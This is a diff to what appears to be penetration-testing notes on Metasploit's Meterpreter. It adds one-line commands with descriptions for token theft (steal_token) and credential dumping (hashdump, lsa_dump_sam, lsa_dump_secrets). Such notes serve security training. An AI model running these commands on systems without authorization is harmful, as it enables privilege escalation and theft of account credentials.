@@ -742,11 +742,54 @@ The Meterpreter payload is an advanced, modular attack platform that employs sop
 <details>
 <summary><h4>Using Meterpreter</h4></summary>
 
-**MSF - Help**
+Displays a list of available Meterpreter commands and their descriptions.
 
 ```bash
 meterpreter > help
 ``` 
+
+Shows the current user (UID) that the Meterpreter session is running under.
+
+```bash
+meterpreter > getuid
+``` 
+
+Lists all running processes on the target system, including PIDs and owners.
+
+```bash
+meterpreter > ps
+``` 
+
+Steals the security token from a specified process (PID 1836) to impersonate its privileges.
+
+```bash
+meterpreter > steal_token 1836
+``` 
+
+Dumps the password hashes of all local user accounts (stored in the SAM database).
+
+```bash
+meterpreter > hashdump
+``` 
+
+Extracts and displays password hashes from the Security Account Manager (SAM) via the LSASS process.
+
+```bash
+meterpreter > lsa_dump_sam
+``` 
+
+Retrieves encrypted secrets (like cached credentials and auto-login passwords) from the LSASS memory.
+
+```bash
+meterpreter > lsa_dump_secrets
+``` 
+
+</details>
+
+<details>
+<summary><h4>Example Compromise Walkthrough</h4></summary>
+
+
 
 **MSF - Meterpreter Migration**
 
